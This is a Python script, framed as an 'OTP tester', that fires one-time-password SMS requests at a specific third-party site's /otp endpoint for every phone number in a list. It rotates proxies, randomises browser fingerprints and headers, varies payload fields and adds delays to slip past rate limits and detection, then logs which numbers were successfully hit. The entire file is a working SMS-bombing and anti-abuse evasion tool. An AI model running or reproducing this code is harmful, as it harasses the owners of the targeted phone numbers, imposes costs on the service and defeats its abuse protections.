import requests
import time
import random
import json
import hashlib
import base64
from fake_useragent import UserAgent
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

class AdvancedOTPTester:
    def __init__(self):
        self.ua = UserAgent()
        self.session = requests.Session()
        self.proxies_list = []
        self.successful = []
        self.failed = []
        self.lock = threading.Lock()
        
        # Load proxies if available
        self.load_proxies()
        
    def load_proxies(self):
        """Load proxies from file if exists"""
        try:
            with open("proxies.txt", "r") as f:
                self.proxies_list = [line.strip() for line in f if line.strip()]
            print(f"Loaded {len(self.proxies_list)} proxies")
        except FileNotFoundError:
            print("No proxies.txt found - using direct connection")
    
    def get_random_proxy(self):
        """Get random proxy from list"""
        if not self.proxies_list:
            return None
        proxy_str = random.choice(self.proxies_list)
        return {
            'http': f'http://{proxy_str}',
            'https': f'http://{proxy_str}'
        }
    
    def generate_fingerprint(self):
        """Generate browser fingerprint"""
        fingerprint = {
            'screen_resolution': f"{random.randint(1280, 3840)}x{random.randint(720, 2160)}",
            'timezone': random.choice(['America/New_York', 'Europe/London', 'Asia/Kolkata', 'Europe/Paris']),
            'language': random.choice(['en-US', 'en-GB', 'en-IN', 'fr-FR']),
            'platform': random.choice(['Win32', 'Linux x86_64', 'MacIntel']),
            'hardware_concurrency': random.choice([4, 8, 12, 16]),
            'device_memory': random.choice([4, 8, 16]),
            'webgl_vendor': random.choice(['Google Inc.', 'Intel Inc.', 'NVIDIA Corporation']),
            'webgl_renderer': random.choice(['ANGLE', 'WebKit', 'Mesa']),
        }
        return fingerprint
    
    def generate_advanced_headers(self, fingerprint):
        """Generate advanced headers with fingerprint"""
        browser_type = random.choice(['chrome', 'firefox', 'edge', 'safari'])
        
        if browser_type == 'chrome':
            user_agent = f"Mozilla/5.0 ({fingerprint['platform']}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(100, 138)}.0.0.0 Safari/537.36"
            sec_ch_ua = f'"Chromium";v="{random.randint(120, 138)}", "Google Chrome";v="{random.randint(120, 138)}", "Not=A?Brand";v="24"'
        elif browser_type == 'firefox':
            user_agent = f"Mozilla/5.0 ({fingerprint['platform']}; r:109.0) Gecko/20100101 Firefox/{random.randint(115, 128)}.0"
            sec_ch_ua = None
        else:
            user_agent = self.ua.random
            sec_ch_ua = None
        
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": fingerprint['language'],
            "Content-Type": "application/json",
            "User-Agent": user_agent,
            "Origin": "https://pack.chromaawards.com",
            "Referer": random.choice([
                "https://pack.chromaawards.com/sign-in",
                "https://pack.chromaawards.com/",
                "https://pack.chromaawards.com/register"
            ]),
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "X-Requested-With": "XMLHttpRequest",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
        }
        
        if sec_ch_ua:
            headers.update({
                "Sec-Ch-Ua": sec_ch_ua,
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
            })
        
        # Add random custom headers
        if random.random() > 0.5:
            headers["X-Client-Version"] = f"{random.randint(1, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
        
        return headers
    
    def generate_payload_variations(self, phone):
        """Generate different payload variations"""
        variations = [
            {"phoneNumber": f"+{phone}"},
            {"phoneNumber": f"+{phone}", "countryCode": "IN"},
            {"phone": f"+{phone}"},
            {"mobile": f"+{phone}"},
            {"phoneNumber": f"+{phone}", "type": "mobile"},
            {"phoneNumber": f"+{phone}", "deviceId": f"device_{random.randint(100000, 999999)}"},
        ]
        return random.choice(variations)
    
    def make_advanced_request(self, phone, attempt=0):
        """Make advanced request with multiple techniques"""
        url = "https://pack.chromaawards.com/otp"
        
        # Generate unique fingerprint for this request
        fingerprint = self.generate_fingerprint()
        headers = self.generate_advanced_headers(fingerprint)
        payload = self.generate_payload_variations(phone)
        
        # Request configuration
        proxies = self.get_random_proxy()
        timeout = random.uniform(10, 20)
        
        # Add random delay
        time.sleep(random.uniform(0.3, 1.5))
        
        try:
            # Use session with advanced settings
            response = self.session.post(
                url,
                headers=headers,
                json=payload,
                proxies=proxies,
                timeout=timeout,
                verify=random.choice([True, False]),  # Sometimes skip SSL verification
                allow_redirects=random.choice([True, False])
            )
            
            return self.process_response(response, phone)
            
        except requests.exceptions.RequestException as e:
            if attempt < 2:  # Retry once
                return self.make_advanced_request(phone, attempt + 1)
            return False, f"Request error: {str(e)}"
        except Exception as e:
            return False, f"Unexpected error: {str(e)}"
    
    def process_response(self, response, phone):
        """Process API response"""
        status_code = response.status_code
        
        if status_code == 200:
            try:
                response_data = response.json()
                # Check for various success indicators
                if any(key in str(response_data).lower() for key in ['success', 'sent', 'otp', 'message', 'true']):
                    return True, "SUCCESS"
                elif isinstance(response_data, dict) and not response_data.get('error'):
                    return True, "SUCCESS"
                else:
                    return False, f"API returned error: {response_data}"
            except:
                # If no JSON, check text content
                if any(key in response.text.lower() for key in ['success', 'sent', 'otp']):
                    return True, "SUCCESS"
                return True, "SUCCESS"  # Assume success for 200 without clear error
        
        elif status_code == 429:
            return False, "RATE_LIMITED"
        
        elif status_code >= 400:
            return False, f"HTTP_{status_code}"
        
        else:
            return False, f"UNEXPECTED_STATUS_{status_code}"
    
    def test_single_number(self, phone):
        """Test single phone number"""
        full_phone = f"+{phone}"
        
        try:
            success, message = self.make_advanced_request(phone)
            
            with self.lock:
                if success:
                    print(f"✅ SUCCESS: {full_phone} - {message}")
                    self.successful.append(phone)
                else:
                    print(f"❌ FAILED: {full_phone} - {message}")
                    self.failed.append(phone)
                    
            return success
            
        except Exception as e:
            with self.lock:
                print(f"⚠️ ERROR: {full_phone} - {str(e)[:50]}...")
                self.failed.append(phone)
            return False
    
    def run_concurrent_test(self, numbers, max_workers=3):
        """Run concurrent testing"""
        print(f"🚀 Testing {len(numbers)} numbers with {max_workers} workers...")
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            # Submit all tasks
            future_to_phone = {
                executor.submit(self.test_single_number, phone): phone 
                for phone in numbers
            }
            
            # Wait for completion
            for future in as_completed(future_to_phone):
                phone = future_to_phone[future]
                try:
                    future.result()
                except Exception as exc:
                    print(f'❌ {phone} generated exception: {exc}')
    
    def save_results(self):
        """Save results to files"""
        timestamp = int(time.time())
        
        # Update numbers.txt
        with open("numbers.txt", "w") as f:
            for num in set([num for num in self.failed if num not in self.successful]):
                f.write(f"{num}\n")
        
        # Save successful numbers
        with open(f"success_{timestamp}.txt", "w") as f:
            for num in self.successful:
                f.write(f"{num}\n")
        
        # Save detailed report
        with open(f"report_{timestamp}.txt", "w") as f:
            f.write(f"OTP Test Report - {time.ctime()}\n")
            f.write("="*50 + "\n")
            f.write(f"Total Tested: {len(self.successful) + len(self.failed)}\n")
            f.write(f"Successful: {len(self.successful)}\n")
            f.write(f"Failed: {len(self.failed)}\n")
            f.write(f"Success Rate: {(len(self.successful)/(len(self.successful)+len(self.failed))*100):.1f}%\n\n")
            
            f.write("SUCCESSFUL NUMBERS:\n")
            for num in self.successful:
                f.write(f"+{num}\n")
            
            f.write("\nFAILED NUMBERS:\n")
            for num in self.failed:
                f.write(f"+{num}\n")

def main():
    """Main function"""
    tester = AdvancedOTPTester()
    
    # Read numbers
    try:
        with open("numbers.txt", "r") as f:
            numbers = [line.strip() for line in f.readlines() if line.strip()]
    except FileNotFoundError:
        print("❌ ERROR: numbers.txt not found!")
        print("Create numbers.txt with phone numbers (one per line)")
        return
    
    if not numbers:
        print("❌ No numbers found in numbers.txt!")
        return
    
    print(f"📱 Loaded {len(numbers)} numbers for testing")
    
    # Test configuration
    max_workers = min(5, len(numbers))  # Adjust based on your needs
    
    # Run tests
    start_time = time.time()
    tester.run_concurrent_test(numbers, max_workers)
    end_time = time.time()
    
    # Save results
    tester.save_results()
    
    # Display summary
    print(f"\n{'='*50}")
    print("🎯 TEST SUMMARY")
    print(f"{'='*50}")
    print(f"Total Numbers: {len(numbers)}")
    print(f"Successful: {len(tester.successful)}")
    print(f"Failed: {len(tester.failed)}")
    print(f"Success Rate: {(len(tester.successful)/len(numbers)*100):.1f}%")
    print(f"Time Taken: {end_time - start_time:.1f} seconds")
    
    if tester.successful:
        print(f"\n✅ SUCCESSFUL NUMBERS:")
        for phone in tester.successful[:10]:  # Show first 10
            print(f"  +{phone}")
        if len(tester.successful) > 10:
            print(f"  ... and {len(tester.successful) - 10} more")

if __name__ == "__main__":
    # Check and install required packages
    try:
        import fake_useragent
    except ImportError:
        print("Installing required packages...")
        import subprocess
        subprocess.check_call(["pip", "install", "fake-useragent", "requests"])
    
    main()
